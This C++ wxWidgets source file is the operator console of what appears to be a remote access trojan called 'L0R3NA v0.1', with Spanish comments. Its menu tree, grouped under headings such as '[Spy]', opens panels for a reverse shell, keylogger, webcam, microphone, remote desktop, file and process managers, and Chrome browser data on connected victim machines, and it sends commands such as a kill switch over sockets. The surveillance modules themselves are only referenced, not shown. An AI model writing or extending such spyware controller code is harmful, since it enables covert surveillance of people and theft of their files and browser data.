#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_transferencias.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "panel_wmanager.hpp"
#include "panel_info_chrome.hpp"
#include "panel_usuarios.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {

    SetTransparent(245);

    this->sckCliente = sckID;
    int npos = strID.find('/', 0);
    this->strClienteID = strID.substr(0, npos);
    //this->strIP = strIP;

    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
    
    wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
    //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]")); <- Aqui ira fun

    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
    this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin, wxT("Transferencias"));

    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));

    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));

    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));

    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));

    //Sizer para hacer el treeview dinamico al hacer resize
    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
    pnl_Left->SetSizer(pnl_left_Sizer);
    //----------------------------------------------

    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    //Sizer para el notebook del lado derecho
    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
    pnl_Right->SetSizer(pnl_right_Sizer);
    //----------------------------------------------

    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
    wxString htmlsource = "<center><p>L0R3NA v0.1</p></center>";
    html->SetPage(htmlsource);
    html->SetSize(wxSize(200, 200));

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(html, ":v", true);
    this->m_tree->p_Notebook->Thaw();
    
    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
    
    this->SetSizerAndFit(sizer);

    SetClientSize(700, 450);


#ifdef DEBUG_DESIGN_LIMITS
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    html->SetBackgroundColour(wxColor(0, 0, 255));
#endif
    
}

void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
    int closedPage = event.GetSelection();
    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
    if (pageTitle == "Reverse Shell") {
        //Enviar comando para cerrar shell al cerra la tab
        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
    }
    event.Skip();
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    int iIndex = p_Servidor->IndexOf(this->strClienteID);

    //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
    if (iIndex != -1) {
        p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
        p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
    }
    event.Skip();
}

//Al hacer doble click en uno de los modulos del panel izquierdo
void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);
    
    bool isFound = false;
    //Si el panel/frame ya esta abierto solo hacer focus
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();

        if (wStr == "Reverse Shell") {
            this->p_Notebook->AddPage(new panelReverseShell(this, this->sckCliente), wStr, true);
        } else if (wStr == "Admin de Archivos") {
            this->p_Notebook->AddPage(new panelFileManager(this, this->sckCliente, this->strClienteID, this->strClienteIP), wStr, true);
        } else if (wStr == "Admin de Procesos") {
            this->p_Notebook->AddPage(new panelProcessManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Keylogger") {
            this->p_Notebook->AddPage(new panelKeylogger(this, this->sckCliente), wStr, true);
        } else if (wStr == "Microfono") {
            this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
        } else if (wStr == "Camara") {
            this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
        }else if (wStr == "Escritorio Remoto") {
            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
            frm_temp->Show(true);
        } else if (wStr == "Transferencias") {
            this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
        } else if (wStr == "Admin de Ventanas") {
            this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Chrome") {
            this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
        }else if (wStr == "Usuarios") {
            this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
        }

        this->p_Notebook->Thaw();
    } 
}
